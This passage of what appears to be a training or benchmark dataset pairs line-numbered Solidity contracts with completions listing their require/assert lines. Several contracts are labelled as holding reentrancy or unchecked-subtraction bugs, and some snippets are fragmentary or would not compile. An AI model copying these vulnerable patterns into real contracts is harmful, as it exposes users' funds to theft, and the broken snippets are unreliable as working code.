external onlyOwner {\n77       vvisr.snapshot();\n78     }\n\n79     function transferOwnership(address newOwner) external onlyOwner {\n80       owner = newOwner;\n81     }\n\n82     function transferTokenOwnership(address newOwner) external onlyOwner {\n83       vvisr.transferOwnership(newOwner); \n84     }\n\n85     function isContract(address _addr) private returns (bool isContract){\n86                                 uint32 size;\n87                                 assembly {\n88                                         size := extcodesize(_addr)\n89                                 }\n90                                 return (size > 0);\n91                 }\n\n92 }",
        "completion": "19+         require(msg.sender == owner, \"only owner\");\n35+         require(visrDeposit > 0, \"deposits must be nonzero\");\n36+         require(to != address(0) && to != address(this), \"to\");\n37+         require(from != address(0) && from != address(this), \"from\");\n49+         require(IVisor(from).owner() == msg.sender); \n51+         assert( IVisor(from) !=  address(this)); \n68+         require(shares > 0, \"shares\");\n69+         require(to != address(0), \"to\");\n70+        require(from != address(0), \"from\");"
    },
    {
        "prompt": "1 // Sources flattened with hardhat v2.1.2 https://hardhat.org\n\n2 // File contracts/v0.4/token/linkERC20Basic.sol\n\n3 pragma solidity ^0.4.11;\n\n\n4 /**\n5  * @title ERC20Basic\n6  * @dev Simpler version of ERC20 interface\n7  * @dev see https://github.com/ethereum/EIPs/issues/179\n8  */\n9 contract linkERC20Basic {\n10   uint256 public totalSupply;\n11   function balanceOf(address who) constant returns (uint256);\n12   function transfer(address to, uint256 value) returns (bool);\n13   event Transfer(address indexed from, address indexed to, uint256 value);\n14 }\n\n\n15 // File contracts/v0.4/token/linkERC20.sol\n\n\n16 /**\n17  * @title ERC20 interface\n18  * @dev see https://github.com/ethereum/EIPs/issues/20\n19  */\n20 contract linkERC20 is linkERC20Basic {\n21   function allowance(address owner, address spender) constant returns (uint256);\n22   function transferFrom(address from, address to, uint256 value) returns (bool);\n23   function approve(address spender, uint256 value) returns (bool);\n24   event Approval(address indexed owner, address indexed spender, uint256 value);\n25 }\n\n\n26 // File contracts/v0.4/token/ERC677.sol\n\n\n27 contract ERC677 is linkERC20 {\n28   function transferAndCall(address to, uint value, bytes data) returns (bool success);\n\n29   event Transfer(address indexed from, address indexed to, uint value, bytes data);\n30 }\n\n\n31 // File contracts/v0.4/token/ERC677Receiver.sol\n\n\n32 contract ERC677Receiver {\n33   function onTokenTransfer(address _sender, uint _value, bytes _data);\n34 }\n\n\n35 // File contracts/v0.4/ERC677Token.sol\n\n36 contract ERC677Token is ERC677 {\n\n37   /**\n38   * @dev transfer token to a contract address with additional data if the recipient is a contact.\n39   * @param _to The address to transfer to.\n40   * @param _value The amount to be transferred.\n41   * @param _data The extra data to be passed to the receiving contract.\n42   */\n43   function transferAndCall(address _to, uint _value, bytes _data)\n44     public\n45     returns (bool success)\n46   {\n47     super.transfer(_to, _value);\n48     Transfer(msg.sender, _to, _value, _data);\n49     if (isContract(_to)) {\n50       contractFallback(_to, _value, _data);\n51     }\n52     return true;\n53   }\n\n\n54   // PRIVATE\n55  //bug: this is the buggy fall back that allows reentrancy\n56   function contractFallback(address _to, uint _value, bytes _data)\n57     private\n58   {\n59     ERC677Receiver receiver = ERC677Receiver(_to);\n60     receiver.onTokenTransfer(msg.sender, _value, _data);\n61   }\n\n62   function isContract(address _addr)\n63     private\n64     returns (bool hasCode)\n65   {\n66     uint length;\n67     assembly { length := extcodesize(_addr) }\n68     return length > 0;\n69   }\n\n70 }\n\n\n71 abstract contract CToken {\n        \n72         function doTransferOut(address payable to, uint amount) virtual internal;\n\n73         doTransferOut(borrower, borrowAmount);\n        \n74         /* We write the previously calculated values into storage */\n75         accountBorrows[borrower].principal = vars.accountBorrowsNew;\n76         accountBorrows[borrower].interestIndex = borrowIndex;\n77         totalBorrows = vars.totalBorrowsNew;\n \n78         /* We emit a Borrow event */\n79         emit Borrow(borrower, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);\n\n80 }\n81 // File contracts/v0.4/math/linkSafeMath.sol\n\n\n\n82 /**\n83  * @title SafeMath\n84  * @dev Math operations with safety checks that throw on error\n85  */\n86 library linkSafeMath {\n87   function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n88     uint256 c = a * b;\n89     assert(a == 0 || c / a == b);\n90     return c;\n91   }\n\n92   function div(uint256 a, uint256 b) internal constant returns (uint256) {\n93     // assert(b > 0); // Solidity automatically throws when dividing by 0\n94     uint256 c = a / b;\n95     // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n96     return c;\n97   }\n\n98   function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n99     assert(b <= a);\n100     return a - b;\n101   }\n\n102   function add(uint256 a, uint256 b) internal constant returns (uint256) {\n103     uint256 c = a + b;\n104     assert(c >= a);\n105     return c;\n106   }\n107 }",
        "completion": "89+    assert(a == 0 || c / a == b);\n99+     assert(b <= a);\n104+    assert(c >= a);"
    },
    {
        "prompt": "1 pragma solidity ^0.5.0;\n\n2 contract ModifierEntrancy {\n\n3   mapping (address => uint) public tokenBalance;\n4   string constant name = \"Nu Token\";\n5   Bank bank;\n  \n6   constructor() public{\n7       bank = new Bank();\n8   }\n\n9   //If a contract has a zero balance and supports the token give them some token\n10   function airDrop() hasNoBalance supportsToken  public{\n11     tokenBalance[msg.sender] += 20;\n12   }\n  \n13   //Checks that the contract responds the way we want\n14   modifier supportsToken() {\n15     require(keccak256(abi.encodePacked(\"Nu Token\")) == bank.supportsToken());\n16     _;\n17   }\n  \n18   //Checks that the caller has a zero balance\n19   modifier hasNoBalance {\n20       require(tokenBalance[msg.sender] == 0);\n21       _;\n22         }\n23   }\n\n24 contract Bank{\n\n25     function supportsToken() external returns(bytes32) {\n26         return keccak256(abi.encodePacked(\"Nu Token\"));\n27     }\n\n28 }",
        "completion": "15+ require(keccak256(abi.encodePacked(\"Nu Token\")) == bank.supportsToken());\n20+  require(tokenBalance[msg.sender] == 0);\n\n"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at BscScan.com on 2021-07-30\n3 */\n\n4 //SPDX-License-Identifier: MIT\n5 pragma solidity ^0.8.0;\n\n\n6 abstract contract ReentrancyGuard {\n7         uint256 private constant _NOT_ENTERED = 1;\n8         uint256 private constant _ENTERED = 2;\n9         uint256 private _status;\n10         constructor () {\n11             _status = _NOT_ENTERED;\n12         }\n    \n13         modifier nonReentrant() {\n14             require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n15             _status = _ENTERED;\n16             _;\n17             _status = _NOT_ENTERED;\n18         }\n19     }\n\n\n20 contract surgeToken{\n  \n21   /** Sells SURGE Tokens And Deposits the BNB into Seller's Address */\n22     function sell(uint256 tokenAmount) public nonReentrant returns (bool) {\n        \n23         address seller = msg.sender;\n        \n24         // make sure seller has this balance\n25         require(_balances[seller] >= tokenAmount, 'cannot sell above token amount');\n        \n26         // calculate the sell fee from this transaction\n27         uint256 tokensToSwap = tokenAmount.mul(sellFee).div(10**2);\n        \n28         // how much BNB are these tokens worth?\n29         uint256 amountBNB = tokensToSwap.mul(calculatePrice());\n        \n30         //reentrant happens here: during call fallback, the attacker invoked purchase multiple times\n31         (bool successful,) = payable(seller).call{value: amountBNB, gas: 40000}(\"\"); \n32         if (successful) {\n33             // subtract full amount from sender\n34             _balances[seller] = _balances[seller].sub(tokenAmount, 'sender does not have this amount to sell');\n35             // if successful, remove tokens from supply\n36             _totalSupply = _totalSupply.sub(tokenAmount);\n37         } else {\n38             revert();\n39         }\n40         emit Transfer(seller, address(this), tokenAmount);\n41         return true;\n42     }\n\n    \n43     function purchase(address buyer, uint256 bnbAmount) internal returns (bool) {\n44         // make sure we don't buy more than the bnb in this contract\n45         require(bnbAmount <= address(this).balance, 'purchase not included in balance');\n46         // previous amount of BNB before we received any        \n47         uint256 prevBNBAmount = (address(this).balance).sub(bnbAmount);\n48         // if this is the first purchase, use current balance\n49         prevBNBAmount = prevBNBAmount == 0 ? address(this).balance : prevBNBAmount;\n50         // find the number of tokens we should mint to keep up with the current price\n51         uint256 nShouldPurchase = hyperInflatePrice ? _totalSupply.mul(bnbAmount).div(address(this).balance) : _totalSupply.mul(bnbAmount).div(prevBNBAmount);\n52         // apply our spread to tokens to inflate price relative to total supply\n53         uint256 tokensToSend = nShouldPurchase.mul(spreadDivisor).div(10**2);\n54         // revert if under 1\n55         if (tokensToSend < 1) {\n56             revert('Must Buy More Than One Surge');\n57         }\n58     }\n\n59 }\n    ",
        "completion": "14+  require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n25+ require(_balances[seller] >= tokenAmount, 'cannot sell above token amount');\n45+  require(bnbAmount <= address(this).balance, 'purchase not included in balance');"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at Etherscan.io on 2020-10-07\n3 */\n\n4 // File: openzeppelin-solidity-2.3.0/contracts/ownership/Ownable.sol\n\n5 pragma solidity ^0.5.0;\n\n6 contract Bank{\n\n\n7 //reentrant here \n8     function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data)\n9         external payable\n10         onlyEOA accrue(msg.value)\n11     {\n12         // 1. Sanity check the input position, or add a new position of ID is 0.\n13         if (id == 0) {\n14             id = nextPositionID++;\n15             positions[id].goblin = goblin;\n16             positions[id].owner = msg.sender;\n17         } else {\n18             require(id < nextPositionID, \"bad position id\");\n19             require(positions[id].goblin == goblin, \"bad position goblin\");\n20             require(positions[id].owner == msg.sender, \"not position owner\");\n21         }\n22         emit Work(id, loan);\n23         // 2. Make sure the goblin can accept more debt and remove the existing debt.\n24         require(config.isGoblin(goblin), \"not a goblin\");\n25         require(loan == 0 || config.acceptDebt(goblin), \"goblin not accept more debt\");\n26         uint256 debt = _removeDebt(id).add(loan);\n27         // 3. Perform the actual work, using a new scope to avoid stack-too-deep errors.\n28         uint256 back;\n29         {\n30             uint256 sendETH = msg.value.add(loan);\n31             require(sendETH <= address(this).balance, \"insufficient ETH in the bank\");\n32             uint256 beforeETH = address(this).balance.sub(sendETH);\n33             Goblin(goblin).work.value(sendETH)(id, msg.sender, debt, data);\n34             back = address(this).balance.sub(beforeETH);\n35         }\n36         // 4. Check and update position debt.\n37         uint256 lessDebt = Math.min(debt, Math.min(back, maxReturn));\n38         debt = debt.sub(lessDebt);\n39         if (debt > 0) {\n40             require(debt >= config.minDebtSize(), \"too small debt size\");\n41             uint256 health = Goblin(goblin).health(id);\n42             uint256 workFactor = config.workFactor(goblin, debt);\n43             require(health.mul(workFactor) >= debt.mul(10000), \"bad work factor\");\n44             _addDebt(id, debt);\n45         }\n46         // 5. Return excess ETH back.\n47         if (back > lessDebt) SafeToken.safeTransferETH(msg.sender, back - lessDebt);\n48     }\n49 }\n  ",
        "completion": "18+         require(id < nextPositionID, \"bad position id\");\n19+         require(positions[id].goblin == goblin, \"bad position goblin\");\n20+         require(positions[id].owner == msg.sender, \"not position owner\");\n24+         require(config.isGoblin(goblin), \"not a goblin\");\n25+        require(loan == 0 || config.acceptDebt(goblin), \"goblin not accept more debt\");\n31+        require(sendETH <= address(this).balance, \"insufficient ETH in the bank\");\n40+         require(debt >= config.minDebtSize(), \"too small debt size\");\n43+         require(health.mul(workFactor) >= debt.mul(10000), \"bad work factor\");"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract A {\n\n3    function get_a()  public returns (uint) {\n4        return 2;\n5    }\n6 }\n\n7 contract NestedFunction {\n\n8     A a;\n9     uint count = 0;\n\n10     constructor () public {\n11     } \n\n12     function foo(uint x) internal returns (uint ret) {\n13         ret = x + 1;\n14     }\n\n15     function far(uint x) public {\n16         assert(foo(x) == x + 1);\n17     }\n\n18     function baz(uint x) public {\n19        uint y;\n20        y = foo(foo(x) + 2);\n21        assert (y == x + 4);\n22     }\n\n23     function bar() public {\n24        assert(a.get_a() == 2);\n25     }\n   \n26     function fooW(uint x) private returns (uint){\n27        count ++; \n28        return foo(x) + count;\n29     }\n\n30     function unhandled(uint x) public {\n31        uint y;\n32        y = foo(foo(x) + foo(foo(x)));\n33        assert (y == 2*x + 4); \n34     }\n\n35 }",
        "completion": "33+  assert (y == 2*x + 4); "
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract LoopNestedWhile {\n\n3     uint[2][2] a;\n\n4     function testNestedWhileLoop() public {\n5         uint i = 0;\n6         while (i < 2) {\n7             uint j = 0;\n8             while (j < 2) {\n9                 a[i][j] = i * 2 + j;\n10                 j += 1;\n11             }\n12             i += 1;\n13         }\n14         assert (a[0][0] == 0);\n15         assert (a[0][1] == 1);\n16         assert (a[1][0] == 2);\n17         assert (a[1][1] == 3);\n18     }\n\n19 }",
        "completion": "14+        assert (a[0][0] == 0);\n15+        assert (a[0][1] == 1);\n16+         assert (a[1][0] == 2);\n17+         assert (a[1][1] == 3);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract MappingNested {\n\n3     mapping (uint => mapping (uint => uint)) m;\n4     mapping (uint => uint[]) n;\n5     uint[] p;\n  \n\n6     constructor() public {\n7         // assert(m[0][22] == 0); \n\n8         m[10][20] = 11;\n9         m[20][10] = 21;\n10         assert (m[10][20] == 11);\n11         assert (m[20][10] == 21);\n12         assert (n[0].length == 0);\n13         n[0].push(22);\n14         n[0].push(33);\n15         assert (n[0].length == 2);\n16         assert (n[1].length == 0); \n17         assert (p.length == 0); \n18     }\n\n19 }",
        "completion": "10+         assert (m[10][20] == 11);\n11+         assert (m[20][10] == 21);\n12+         assert (n[0].length == 0);\n15+         assert (n[0].length == 2);\n16+         assert (n[1].length == 0); \n17+         assert (p.length == 0); "
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 //simple library with no internal state\n\n3 library Lib {\n4     function add(uint _a, uint _b) public view returns (uint r) {\n5         address x = address(this);\n6         assert(x == msg.sender);\n7         r = _a + _b;\n8     }\n9 }\n\n10 contract C {\n11     // using Lib for uint;\n\n12     function foo() public {\n13         uint x = 1;\n14         uint y = 2;\n15         uint z = Lib.add(x, y);\n16         assert (z == 3);\n17     }\n18 }",
        "completion": "6+ assert(x == msg.sender);\n16+ assert (z == 3);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 // This test passes, but assertion on line 35 is only proved\n3 // up to 4 transactions\n4 // This result means that ctor A is only called once, for B, as A(x+1)\n5 // Compare this test with ConstructorChaining2_fail.sol: no ctor args there,\n6 // so the workaround in the compiler doesn't work, and the base ctor is called twice \n\n\n7 // Example of the trace:\n8 // D(x) is called, where x is 716\n9 // B(x+3) called, where x is 716, B's arg is 719\n10 // A(x+1) called, where x is 720. A's arg is 720\n11 // ctor A {a = x} , where a is 720\n12 // ctor B  {b = x+1 } , where x is 719, b is 720\n13 // C(x+4) is called, where x is 716, C's arg is 720\n14 // ctor C   { c = x + 2}, where x is 720, c is 722\n\n15 contract A {\n16     uint a;\n17     constructor (uint x) public {\n18         a = x;\n19     }\n20 }\n\n21 contract B is A {\n22     uint b;\n23     constructor (uint x) A(x+1) public {  \n24         b = x + 1;\n25                 assert(a == x + 1);\n26     }\n27 }\n\n28 contract C is A {\n29     uint c;\n30     //constructor (uint x) A(x+2) public {          // no A with ANY args here, otherwise, solc error:\n31                                                                                                         // \"Base constr args given twice\"\n32         constructor (uint x) public {\n33         c = x + 2;\n34                 assert(a == x);       // passes, but proved to only 4 transactions        \n35     }\n36 }\n\n37 contract D is B, C {\n38     constructor (uint x) B(x+3) C(x+4) public\n39     {        \n40         assert (a == x + 4);  //after calling B(x+3); calling C(x+4) does not affect this assert\n41         assert (b == x + 4);  //after calling B(x+3)\n42         assert (c == x + 6);    // after calling C(x+4)\n43     }\n44 }",
        "completion": "25+  assert(a == x + 1);\n34+  assert(a == x); \n40+  assert (a == x + 4); \n41+  assert (b == x + 4);  \n42+ assert (c == x + 6); "
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n2 contract B {\n3    function funcB() public pure returns (uint) {\n4        return 42;\n5    }\n6    constructor() public {}\n7 }\n\n8 contract A {\n9    function funcA1() public pure returns (uint) {\n10        return 11;\n11    }\n12    function funcA2(uint x) public pure returns (uint) {\n13        return x+1;\n14    }\n15    function funcA3() public returns (B) {\n16        B retVal= new B();\n17        return retVal;\n18    }\n19    constructor() public\n20     {\n21                 assert(funcA2(funcA1())==12);\n22             assert(funcA3().funcB()==42);\n23     }\n24 }",
        "completion": "21+  assert(funcA2(funcA1())==12);\n22+  assert(funcA3().funcB()==42);"
    },
    {
        "prompt": "1 pragma solidity ^0.5.0;\n\n2 import \"./IERC20.sol\";\n3 import \"./SafeMath.sol\"; //import \"../../math/SafeMath.sol\";\n4 import \"./Libraries/VeriSolContracts.sol\"; //change \n\n5 contract ERC20 is IERC20 {\n6     using SafeMath for uint256;\n\n7     mapping (address => uint256) private _balances;\n\n8     mapping (address => mapping (address => uint256)) private _allowances;\n\n9     uint256 private _totalSupply;\n\n\n  \n10     constructor (uint256 totalSupply) public {\n11        require(msg.sender != address(0));\n12        _totalSupply = totalSupply;\n13        _balances[msg.sender] = totalSupply;\n14     }\n\n\n \n15     function totalSupply() public view returns (uint256) {\n16         return _totalSupply;\n17     }\n\n \n18     function balanceOf(address account) public view returns (uint256) {\n19         return _balances[account];\n20     }\n\n  \n21     function transfer(address recipient, uint256 amount) public returns (bool) {\n22         _transfer(msg.sender, recipient, amount);\n23         assert (_balances[msg.sender] + _balances[recipient]) == _balances[msg.sender] + _balances[recipient];\n24         assert (msg.sender == recipient ||  _balances[msg.sender] == _balances[msg.sender] - amount);\n25         assert (_balances[recipient] >= _balances[recipient]);\n\n26         return true;\n27     }\n\n28     function allowance(address owner, address spender) public view returns (uint256) {\n29         return _allowances[owner][spender];\n30     }\n\n31     function approve(address spender, uint256 value) public returns (bool) {\n32         _approve(msg.sender, spender, value);\n33         return true;\n34     }\n\n35     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n36         _transfer(sender, recipient, amount);\n37         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\n38         return true;\n39     }\n\n\n40     function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n41         _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\n42         return true;\n43     }\n\n \n44     function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n45         _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\n46         return true;\n47     }\n\n\n \n48     function _transfer(address sender, address recipient, uint256 amount) internal {\n49         require(sender != address(0), \"ERC20: transfer from the zero address\");\n50         require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n51         _balances[sender] = _balances[sender] - amount; // _balances[sender].sub(amount); // BUG\n52         _balances[recipient] = _balances[recipient].add(amount);\n53         emit Transfer(sender, recipient, amount);\n54     }\n\n \n55     function _mint(address account, uint256 amount) internal {\n56         require(account != address(0), \"ERC20: mint to the zero address\");\n\n57         _totalSupply = _totalSupply.add(amount);\n58         _balances[account] = _balances[account].add(amount);\n59         emit Transfer(address(0), account, amount);\n60     }\n\n \n61     function _burn(address account, uint256 value) internal {\n62         require(account != address(0), \"ERC20: burn from the zero address\");\n\n63         _totalSupply = _totalSupply.sub(value);\n64         _balances[account] = _balances[account].sub(value);\n65         emit Transfer(account, address(0), value);\n66     }\n\n67     /**\n68      * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n69      *\n70      * This is internal function is equivalent to `approve`, and can be used to\n71      * e.g. set automatic allowances for certain subsystems, etc.\n72      *\n73      * Emits an {Approval} event.\n74      *\n75      * Requirements:\n76      *\n77      * - `owner` cannot be the zero address.\n78      * - `spender` cannot be the zero address.\n79      */\n80     function _approve(address owner, address spender, uint256 value) internal {\n81         require(owner != address(0), \"ERC20: approve from the zero address\");\n82         require(spender != address(0), \"ERC20: approve to the zero address\");\n\n83         _allowances[owner][spender] = value;\n84         emit Approval(owner, spender, value);\n85     }\n\n86     function _burnFrom(address account, uint256 amount) internal {\n87         _burn(account, amount);\n88         _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));\n89     }\n\n90      function contractInvariant() private view {\n91          assert(_totalSupply == VeriSol.SumMapping(_balances);\n92      }\n\n\n93 }",
        "completion": "11+ require(msg.sender != address(0));\n22+  _transfer(msg.sender, recipient, amount);\n23+  assert (_balances[msg.sender] + _balances[recipient]) == _balances[msg.sender] + _balances[recipient];\n24+  assert (msg.sender == recipient ||  _balances[msg.sender] == _balances[msg.sender] - amount);\n25+  assert (_balances[recipient] >= _balances[recipient]);\n49+  require(sender != address(0), \"ERC20: transfer from the zero address\");\n50+  require(recipient != address(0), \"ERC20: transfer to the zero address\");\n62+  require(account != address(0), \"ERC20: burn from the zero address\");\n81+ require(owner != address(0), \"ERC20: approve from the zero address\");\n82+ require(spender != address(0), \"ERC20: approve to the zero address\");\n91+ assert(_totalSupply == VeriSol.SumMapping(_balances);"
    },
    {
        "prompt": "\n1 pragma solidity ^0.4.11;\n\n2 interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData); }\n\n3 contract owned {\n4     address public owner;\n\n5     function owned() {\n6         owner = msg.sender;\n7     }\n\n8     modifier onlyOwner {\n9         require(msg.sender == owner);\n10         _;\n11     }\n\n12     function transferOwnership(address newOwner) onlyOwner {\n13         owner = newOwner;\n14     }\n15 }\n\n16 contract PylonToken is owned {\n17     // Public variables of the token\n18     string public standard = \"Pylon Token - The first decentralized energy exchange platform powered by renewable energy\";\n19     string public name = 'Pylon Token';\n20     string public symbol = 'PYLNT';\n21     uint8 public decimals = 18;\n22     uint256 public totalSupply = 3750000000000000000000000;\n\n23     // This creates an array with all balances\n24     mapping (address => uint256) public balanceOf;\n25     mapping (address => bool) public frozenAccount;\n\n26     // This notifies about accounts locked\n27     event FrozenFunds(address target, bool frozen);\n\n28     // This generates a public event on the blockchain that will notify clients\n29     event Transfer(address indexed from, address indexed to, uint256 value);\n\n30     // This notifies clients about the amount burnt\n31     event Burn(address indexed from, uint256 value);\n\n32     using SafeMath for uint256;\n\n33     address public beneficiary = 0xAE0151Ca8C9b6A1A7B50Ce80Bf7436400E22b535;  //Chip-chap Klenergy Address of ether beneficiary account\n34     uint256 public fundingGoal = 21230434782608700000000;     // Foundig goal in weis = 21230,434782608700000000 Ethers\n35     uint256 public amountRaised;    // Quantity of weis investeds\n36     uint256 public deadline; // durationInMinutes * 60 / 17 + 5000;        // Last moment to invest\n37     uint256 public price = 6608695652173910;           // Ether cost of each token in weis 0,006608695652173910 ethers\n\n38     uint256 public totalTokensToSend = 3250000000000000000000000; // Total tokens offered in the total ICO\n\n39     uint256 public maxEtherInvestment = 826086956521739000000; //Ethers. To mofify the day when starts crowdsale, equivalent to 190.000\u20ac = 826,086956521739000000 ether\n40     uint256 public maxTokens = 297619047619048000000000; // 297,619.047619048000000000 PYLNT = 190.000 \u20ac + 56% bonus\n\n41     uint256 public bonusCap = 750000000000000000000000; // 750,000.000000000000000000 PYLNT last day before Crowdsale as 1,52\u20ac/token\n42     uint256 public pylonSelled = 0;\n\n43     uint256 public startBlockBonus;\n\n44     uint256 public endBlockBonus1;\n\n45     uint256 public endBlockBonus2;\n\n46     uint256 public endBlockBonus3;\n\n47     uint256 public qnt10k = 6578947368421050000000; // 6,578.947368421050000000 PYLNT = 10.000 \u20ac\n\n48     bool fundingGoalReached = false; // If founding goal is reached or not\n49     bool crowdsaleClosed = false;    // If crowdsale is closed or open\n\n50     event GoalReached(address deposit, uint256 amountDeposited);\n51     event FundTransfer(address backer, uint256 amount, bool isContribution);\n52     event LogQuantity(uint256 _amount, string _message);\n\n53     // Chequear\n54     uint256 public startBlock = getBlockNumber();\n\n55     bool public paused = false;\n\n56     //uint256 public balanceInvestor;\n57     //uint256 public ultimosTokensEntregados;\n\n58     modifier contributionOpen() {\n59         require(getBlockNumber() >= startBlock && getBlockNumber() <= deadline);\n60         _;\n61     }\n\n62     modifier notPaused() {\n63         require(!paused);\n64         _;\n65     }\n\n66     function crowdsale() onlyOwner{\n67         paused = false;\n68     }\n\n69     event TokenPurchase(address indexed purchaser, address indexed investor, uint256 value, uint256 amount);\n\n\n70     function PylonToken(\n71         uint256 initialSupply,\n72         string tokenName,\n73         uint8 decimalUnits,\n74         string tokenSymbol,\n75         address centralMinter,\n76         address ifSuccessfulSendTo,\n77         uint256 fundingGoalInWeis,\n78         uint256 durationInMinutes,\n79         uint256 weisCostOfEachToken\n80     ) {\n81         if (centralMinter != 0) owner = centralMinter;\n\n82         balanceOf[msg.sender] = initialSupply;              // Give the creator all initial tokens\n83         totalSupply = initialSupply;                        // Update total supply\n84         name = tokenName;                                   // Set the name for display purposes\n85         symbol = tokenSymbol;                               // Set the symbol for display purposes\n86         decimals = decimalUnits;                            // Amount of decimals for display purposes\n\n87         beneficiary = ifSuccessfulSendTo;\n88         fundingGoal = fundingGoalInWeis;\n89         startBlock = getBlockNumber();\n90         startBlockBonus = getBlockNumber();\n91         endBlockBonus1 = getBlockNumber() + 15246 + 12600 + 500;    // 3 days + 35,5h + margen error = 15246 + 12600 + 500\n92         endBlockBonus2 = getBlockNumber() + 30492 + 12600 + 800;    // 6 days + 35,5h + margen error = 30492 + 12600 + 800\n93         endBlockBonus3 = getBlockNumber() + 45738 + 12600 + 1100;   // 9 days + 35,5h + margen error = 45738 + 12600 + 1100\n94         deadline = getBlockNumber() + (durationInMinutes * 60 / 17) + 5000; // durationInMinutes * 60 / 17 + 12600 + 5000 = Calculo bloques + margen error\n95         price = weisCostOfEachToken;\n96     }\n\n\n97     function _transfer(address _from, address _to, uint _value) internal {\n98         require(_to != 0x0);                             \n99         require(balanceOf[_from] >= _value);                \n100         require(balanceOf[_to] + _value > balanceOf[_to]);  \n101         require(!frozenAccount[_from]);                     \n102         require(!frozenAccount[_to]);                      \n103         balanceOf[_from] -= _value;                         \n104         balanceOf[_to] += _value;                          \n105         Transfer(_from, _to, _value);\n106     }\n\n\n107     function transfer(address _to, uint256 _value) {\n108         _transfer(msg.sender, _to, _value);\n109     }\n\n\n110     function burn(uint256 _value) onlyOwner returns (bool success) {\n111         require(balanceOf[msg.sender] >= _value);   // Check if the sender has enough\n112         balanceOf[msg.sender] -= _value;            // Subtract from the sender\n113         totalSupply -= _value;                      // Updates totalSupply\n114         Burn(msg.sender, _value);\n115         return true;\n116     }\n\n  \n117     function burnFrom(address _from, uint256 _value) onlyOwner returns (bool success) {\n118         require(balanceOf[_from] >= _value);                // Check if the targeted balance is enough\n119         balanceOf[_from] -= _value;                         // Subtract from the targeted balance\n120         totalSupply -= _value;                              // Update totalSupply\n121         Burn(_from, _value);\n122         return true;\n123     }\n\n\n124     function mintToken(address target, uint256 mintedAmount) onlyOwner {\n125         balanceOf[target] += mintedAmount;\n126         totalSupply += mintedAmount;\n127         Transfer(0, owner, mintedAmount);\n128         Transfer(owner, target, mintedAmount);\n129     }\n\n\n130     function freezeAccount(address target, bool freeze) onlyOwner {\n131         frozenAccount[target] = freeze;\n132         FrozenFunds(target, freeze);\n133     }\n\n\n134     function () payable notPaused{\n135         buyTokens(msg.sender);\n136     }\n\n137     // low level token purchase function\n138     function buyTokens(address investor) payable notPaused {\n139         require (!crowdsaleClosed); // Check if crowdsale is open or not\n140         require(investor != 0x0);  \n141         require(validPurchase()); \n142         require(maxEtherInvestment >= msg.value); \n143         require(balanceOf[investor] <= maxTokens); \n144         require(amountRaised <= fundingGoal); \n145         require(pylonSelled <= totalTokensToSend); \n\n\n146         //Check if It's time for pre ICO or ICO\n147         if(startBlockBonus <= getBlockNumber() && startBlock <= getBlockNumber() && endBlockBonus3 >= getBlockNumber() && pylonSelled <= bonusCap){\n148           buyPreIco(investor);\n149         } else if(deadline >= getBlockNumber()){\n150           buyIco(investor);\n151         }\n\n152     }\n\n153     function buyIco(address investor) internal{\n154       uint256 weiAmount = msg.value;\n\n155       // calculate token amount to be sent\n156       uint256 tokens = weiAmount.mul(10**18).div(price);\n\n157       require((balanceOf[investor] + tokens) <= maxTokens);    \n158       require(balanceOf[this] >= tokens);           \n159       require(pylonSelled + tokens <= totalTokensToSend);\n160      balanceOf[this] -= tokens;\n161       balanceOf[investor] += tokens;\n162       amountRaised += weiAmount; // update state amount raised\n163       pylonSelled += tokens; // Total tokens selled\n\n164       beneficiary.transfer(weiAmount); //Transfer ethers to beneficiary\n\n165       frozenAccount[investor] = true;\n166       FrozenFunds(investor, true);\n\n167       TokenPurchase(msg.sender, investor, weiAmount, tokens);\n168     }\n\n169     function buyPreIco(address investor) internal{\n170       uint256 weiAmount = msg.value;\n\n171       uint256 bonusPrice = 0;\n172       uint256 tokens = weiAmount.mul(10**18).div(price);\n\n173       if(endBlockBonus1 >= getBlockNumber()){\n174         if(tokens == qnt10k.mul(19) ){\n175           bonusPrice = 2775652173913040;\n176         }else if(tokens >= qnt10k.mul(18) && tokens < qnt10k.mul(19)){\n177           bonusPrice = 2907826086956520;\n178         }else if(tokens >= qnt10k.mul(17) && tokens < qnt10k.mul(18)){\n179           bonusPrice = 3040000000000000;\n180         }else if(tokens >= qnt10k.mul(16) && tokens < qnt10k.mul(17)){\n181           bonusPrice = 3172173913043480;\n182         }else if(tokens >= qnt10k.mul(15) && tokens < qnt10k.mul(16)){\n183           bonusPrice = 3304347826086960;\n184         }else if(tokens >= qnt10k.mul(14) && tokens < qnt10k.mul(15)){\n185           bonusPrice = 3436521739130430;\n186         }else if(tokens >= qnt10k.mul(13) && tokens < qnt10k.mul(14)){\n187           bonusPrice = 3568695652173910;\n188         }else if(tokens >= qnt10k.mul(12) && tokens < qnt10k.mul(13)){\n189           bonusPrice = 3700869565217390;\n190         }else if(tokens >= qnt10k.mul(11) && tokens < qnt10k.mul(12)){\n191           bonusPrice = 3833043478260870;\n192         }else if(tokens >= qnt10k.mul(10) && tokens < qnt10k.mul(11)){\n193           bonusPrice = 3965217391304350;\n194         }else if(tokens 